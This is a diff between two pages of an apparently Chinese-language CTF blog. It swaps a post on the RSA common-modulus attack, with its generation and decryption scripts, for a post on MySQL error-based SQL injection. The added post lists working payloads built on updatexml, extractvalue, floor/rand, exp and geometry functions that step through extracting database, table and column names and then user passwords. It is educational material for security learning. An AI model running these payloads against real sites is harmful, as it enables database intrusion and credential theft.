@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>共模攻击 |  CTF</title>
+      <title>报错注入 |  CTF</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -56,7 +56,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-共模攻击"
+  id="post-报错注入"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -67,7 +67,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  共模攻击
+  报错注入
 </h1>
  
 
@@ -75,11 +75,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2023/01/14/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/" class="article-date">
-  <time datetime="2023-01-14T11:57:56.000Z" itemprop="datePublished">2023-01-14</time>
+      <a href="/2023/02/02/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2023-02-02T08:59:42.000Z" itemprop="datePublished">2023-02-02</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/crypto/">crypto</a> / <a class="article-category-link" href="/categories/crypto/RSA/">RSA</a>
+    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/Sql/">Sql</a>
   </div>
   
 <div class="word_count">
@@ -87,7 +87,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">675</span>
+            <span class="post-count">694</span>
         </span>
     </span>
 
@@ -111,38 +111,68 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>共模攻击，利用的大前提就是，RSA体系在生成密钥的过程中使用了相同的模数n。在CTF题目中，就是同一明文，同一n,不同e进行加密。m,n相同；e,c不同，且e1和e2互质</p>
-<h3 id="出题脚本："><a href="#出题脚本：" class="headerlink" title="出题脚本："></a>出题脚本：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment">#生成素数</span></span><br><span class="line">p=libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">q=libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">e1=<span class="number">2333</span></span><br><span class="line">e2=<span class="number">23333</span></span><br><span class="line">m=<span class="string">&quot;flag&#123;6ed4c74e022cb18c8039e96de93aa9ce&#125;&quot;</span></span><br><span class="line">m=libnum.s2n(m)</span><br><span class="line">n=p*q</span><br><span class="line">c1=<span class="built_in">pow</span>(m,e1,n)</span><br><span class="line">c2=<span class="built_in">pow</span>(m,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n1=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1=&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1=&quot;</span>,c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n2=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2=&quot;</span>,e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2=&quot;</span>,c2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+  <h3 id="1-报错注入的介绍"><a href="#1-报错注入的介绍" class="headerlink" title="1.报错注入的介绍"></a>1.报错注入的介绍</h3><p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用。</p>
+<h4 id="报错注入分类"><a href="#报错注入分类" class="headerlink" title="报错注入分类"></a>报错注入分类</h4><p>MySQL的报错注入主要是利用MySQL的一些逻辑漏洞，根据漏洞原因的不同，可以将MySQL报错注入 分为以下几类：</p>
+<ul>
+<li>BigInt等数据类型溢出   <a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/articles/5509112.html"></a></li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">!</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x)</span><br></pre></td></tr></table></figure>
 
-<h3 id="解密脚本："><a href="#解密脚本：" class="headerlink" title="解密脚本："></a>解密脚本：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n= <span class="number">25333966058003377512707481338795714713737652659944601834182685873529702913988641983855700459996104700470621411559153944988952210084014634675583566338568882440708528997808798650962116756969822211586531522430245040013570571043385238601846104615050089457836721437790715225367971106085839523500735480715155424498941150468093083816830215632716244390679417218873179734276657411907216486790815037105108306055794473002315541787461904728375164737225486501009857299717749346279371251245318729951905832578739696926931502225899707226264570557623527701806829827566904224572897378639191756878049342203546309520458672464170859577433</span></span><br><span class="line">e1= <span class="number">2333</span></span><br><span class="line">c1= <span class="number">11355981897781478907853356911752561659125575027336719997290835661089901154031171698660586203170528368228850895159361637188990782030255983633790580700032092629587631108597144196551438410868034739981960656110887650747325311613900008001234835897835613759692146419080113176963747835592656185435741504176116672174539018089139547795447109458469225330809064539216773123671814859510069089532677704482026169178543062578686794346026774853085101278125763460212801929360456888869350105294595904940799522522144740464043605342348269086324747729288399275079874271519208155039364092577755518532799345651172433227745483422620900776136</span></span><br><span class="line">e2= <span class="number">23333</span></span><br><span class="line">c2= <span class="number">1326499538902841116411674554069945581390130048432351353260154261863309471312810811160302458644816390944833633923435634961251092531893503039914793217247984595331920909367627316087404934402312358642315675486438968585084964845763881078835787872160374025547400141298650794551970291119975344578667689961134814676553190178139842507675899262024572370313939107080072875068218336255452161407859907308656094331557912187788276334833723893856310434523337557011032081467262457427167978528280339494077785813461280853735266463152709443731638714219391773144349752633555310299318290576258086971373777118482642702020599928071855133041</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#共模攻击</span></span><br><span class="line"><span class="comment">#共模攻击函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_gong_N_def</span>(<span class="params">e1,e2,c1,c2,n</span>):</span><br><span class="line">    e1, e2, c1, c2, n=<span class="built_in">int</span>(e1),<span class="built_in">int</span>(e2),<span class="built_in">int</span>(c1),<span class="built_in">int</span>(c2),<span class="built_in">int</span>(n)</span><br><span class="line">    s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1,s1,n) * <span class="built_in">pow</span>(c2 ,s2 ,n)) % n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line">m = rsa_gong_N_def(e1,e2,c1,c2,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>xpath语法错误    xpath报错最多只能报出32位字符  所以要使用字符截取函数</p>
+</li>
+<li><p>count()+rand()+group_by()导致主键重复 </p>
+</li>
+<li><p>空间数据类型函数错误</p>
+</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x--+</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="共模攻击原理："><a href="#共模攻击原理：" class="headerlink" title="共模攻击原理："></a>共模攻击原理：</h3><p>两个及以上的公钥(n,e)来加密同一条信息m</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c1 = <span class="built_in">pow</span>(m, e1, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, n)</span><br></pre></td></tr></table></figure>
 
-<p>e1，e2互质，则有</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcd(e1,e2)=<span class="number">1</span></span><br></pre></td></tr></table></figure>
 
-<p>根据扩展欧几里德算法 对于不完全为 0 的整数 a，b，gcd（a，b）表示 a，b 的最大公约数。那么一定存在整数 x，y 使得 gcd（a，b）&#x3D;ax+by</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e1*s1+e2*s2 = <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h3 id="2-报错注入的攻击流程"><a href="#2-报错注入的攻击流程" class="headerlink" title="2.报错注入的攻击流程"></a>2.报错注入的攻击流程</h3><h4 id="1-判断注入类型"><a href="#1-判断注入类型" class="headerlink" title="1.判断注入类型"></a>1.判断注入类型</h4><p>先判断是字符型还是数字型</p>
+<h4 id="2-获取数据库名称"><a href="#2-获取数据库名称" class="headerlink" title="2.获取数据库名称"></a>2.获取数据库名称</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)%23</span></span><br></pre></td></tr></table></figure>
 
-<p>s1、s2皆为整数，但是一正一负，假设s1为正数,s2为负数</p>
-<p>因为</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c1 = m^e1%n</span><br><span class="line">c2 = m^e2%n</span><br></pre></td></tr></table></figure>
+<h4 id="3-获取数据库表名"><a href="#3-获取数据库表名" class="headerlink" title="3.获取数据库表名"></a>3.获取数据库表名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),0x7e),1)%23</span></span><br></pre></td></tr></table></figure>
 
-<p>可得：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(c1^s1*c2^s2)%n = ((m^e1%n)^s1(m^e2%n)^s2)%n</span><br></pre></td></tr></table></figure>
+<h4 id="4-获取字段名"><a href="#4-获取字段名" class="headerlink" title="4.获取字段名"></a>4.获取字段名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; and table_schema=&#x27;</span>security<span class="string">&#x27;),0x7e),1)%23</span></span><br></pre></td></tr></table></figure>
 
-<p>根据模运算性质： 幂运算是一种关于幂的数学运算。同底数幂相乘，底数不变，指数相加。同底数幂相除，底数不变，指数相减。幂的乘方，底数不变，指数相乘。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(a * b) % p = (a % p * b % p) % p</span><br><span class="line">a ^ b % p = ((a % p) ^ b) % p</span><br></pre></td></tr></table></figure>
+<p> union select (exp(~(select * FROM(SELECT USER())a))),2, 3–+</p>
+<h4 id="5-获取字段内容"><a href="#5-获取字段内容" class="headerlink" title="5.获取字段内容"></a>5.获取字段内容</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)%23</span></span><br></pre></td></tr></table></figure>
 
-<p>简化公式为：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(c1^s1*c2^s2)%n = ((m^e1%n)^s1*(m^e2%n)^s2)%n</span><br><span class="line"></span><br><span class="line">=&gt; (c1^s1*c2^s2)%n = ((m^e1%n)^s1%n*(m^e2%n)^s2%n)%n <span class="comment">#(a * b) % p = (a % p * b % p) % p</span></span><br><span class="line"></span><br><span class="line">=&gt; (c1^s1*c2^s2)%n = ((m^e1)^s1%n*(m^e2)^s2%n)%n <span class="comment">#((a % p) ^ b) % p =a ^ b % p</span></span><br><span class="line"></span><br><span class="line">=&gt; (c1^s1*c2^s2)%n = ((m^e1)^s1*(m^e2)^s2)%n <span class="comment"># (a % p * b % p) % p=(a * b) % p</span></span><br><span class="line"></span><br><span class="line">=&gt;(c1^s1*c2^s2)%n = ((m^(e1*s1)*(m^(e2*s2))%n <span class="comment">#。幂的乘方，底数不变，指数相乘。</span></span><br><span class="line"></span><br><span class="line">(c1^s1*c2^s2)%n = (m^(e1*s1+e2*s2))%n  <span class="comment"># 同底数幂相乘，底数不变，指数相加。</span></span><br></pre></td></tr></table></figure>
 
-<p>因为 e1<em>s1+e2</em>s2 &#x3D; 1 得：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(c1^s1*c2^s2)%n = (m^<span class="number">1</span>)%n</span><br><span class="line"></span><br><span class="line">(c1^s1*c2^s2）%n=m</span><br></pre></td></tr></table></figure>
 
-<p>上述就是rsa共模攻击的过程</p>
-<p>因此，同一m，同一n,不同e，进行加密。在不需要知道d的情况下，可以进行解密。 </p>
+<h3 id="3-报错注入的一些函数"><a href="#3-报错注入的一些函数" class="headerlink" title="3.报错注入的一些函数"></a>3.报错注入的一些函数</h3><h4 id="1-Updatexml"><a href="#1-Updatexml" class="headerlink" title="1.Updatexml()"></a>1.Updatexml()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">函数语法：updatexml(XML_document, XPath_string, </span><br><span class="line">new_value);</span><br><span class="line">适用版本: 5.1.5+</span><br><span class="line">我们通常在第二个xpath参数填写我们要查询的内容。</span><br><span class="line">updatexml是由于参数的格式不正确而产生的错误，同样也会返回参数 的信息。</span><br><span class="line">payload: updatexml(1,concat(0x7e,(select user()),0x7e),1)</span><br><span class="line">前后添加~使其不符合xpath格式从而报错。</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-extractvalue"><a href="#2-extractvalue" class="headerlink" title="2.extractvalue()"></a>2.extractvalue()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数语法：EXTRACTVALUE (XML_document, XPath_string);</span><br><span class="line">适用版本：5.1.5+</span><br><span class="line">利用原理与updatexml函数相同</span><br><span class="line">payload: extractvalue(1,concat(0x7e,(select user()),0x7e))</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-floor"><a href="#3-floor" class="headerlink" title="3.floor()"></a>3.floor()</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat(version(), <span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)) </span><br></pre></td></tr></table></figure>
+
+<p>如果关键的表被禁用了，可以使用这种形式 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">!</span><span class="number">1</span>) <span class="keyword">group</span> <span class="keyword">by</span> concat(version(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)) </span><br></pre></td></tr></table></figure>
+
+<p>如果 rand 被禁用了可以使用用户变量来报错 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(<span class="variable">@a</span>:<span class="operator">=</span><span class="number">1</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> concat(password,<span class="variable">@a</span>:<span class="operator">=</span>(<span class="variable">@a</span><span class="operator">+</span><span class="number">1</span>)<span class="operator">%</span><span class="number">2</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-exp"><a href="#4-exp" class="headerlink" title="4.exp"></a>4.exp</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/articles/5509124.html">exp</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> database())x))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)x))</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-geometrycollection"><a href="#5-geometrycollection" class="headerlink" title="5.geometrycollection()"></a>5.geometrycollection()</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> database())a)b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-multipoint"><a href="#6-multipoint" class="headerlink" title="6.multipoint()"></a>6.multipoint()</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> database())a)b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="7-polygon"><a href="#7-polygon" class="headerlink" title="7.polygon"></a>7.polygon</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> database())a)b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="8-multipolygon"><a href="#8-multipolygon" class="headerlink" title="8.multipolygon"></a>8.multipolygon</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> database())a)b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="9-linestring"><a href="#9-linestring" class="headerlink" title="9.linestring"></a>9.linestring</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> database())a)b))</span><br></pre></td></tr></table></figure>
+
+<h4 id="10-multilinestring"><a href="#10-multilinestring" class="headerlink" title="10.multilinestring"></a>10.multilinestring</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span>(<span class="keyword">select</span> database())a)b))</span><br></pre></td></tr></table></figure>
+
  
       <!-- reward -->
       
@@ -213,12 +243,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/01/14/%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/02/02/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RSA/" rel="tag">RSA</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li></ul>
 
     </footer>
   </div>
@@ -226,19 +256,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2023/01/14/wiener-%E7%BB%B4%E7%BA%B3-%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC%EF%BC%88e%E7%9A%84%E6%8C%87%E6%95%B0%E5%BE%88%E5%A4%A7%EF%BC%89/" class="article-nav-link">
+      <a href="/2023/02/13/HSCSEC-%E7%BA%A2%E5%AE%A2%E7%AA%81%E5%87%BB%E9%98%9F-2023/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            wiener(维纳)攻击脚本（e的指数很大）
+            HSCSEC-红客突击队-2023
           
         </div>
       </a>
     
     
-      <a href="/2023/01/14/RSA%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E4%B8%8E%E8%AF%BB%E5%8F%96/" class="article-nav-link">
+      <a href="/2023/02/02/%E7%9B%B2%E6%B3%A8/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">RSA密钥生成与读取</div>
+        <div class="article-nav-title">盲注</div>
       </a>
     
   </nav>
